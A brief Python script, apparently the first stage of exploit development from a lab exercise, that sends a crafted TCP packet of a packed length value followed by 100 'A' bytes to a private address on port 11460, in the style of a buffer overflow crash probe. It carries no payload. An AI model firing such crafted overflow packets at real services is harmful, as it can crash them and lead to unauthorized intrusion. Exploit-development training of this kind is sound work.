#!/usr/bin/env python3

import socket
import sys
import struct

buf = struct.pack(">i", 0x1234)
buf += bytearray([0x41] * 100)

def main():
    if len(sys.argv) != 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()
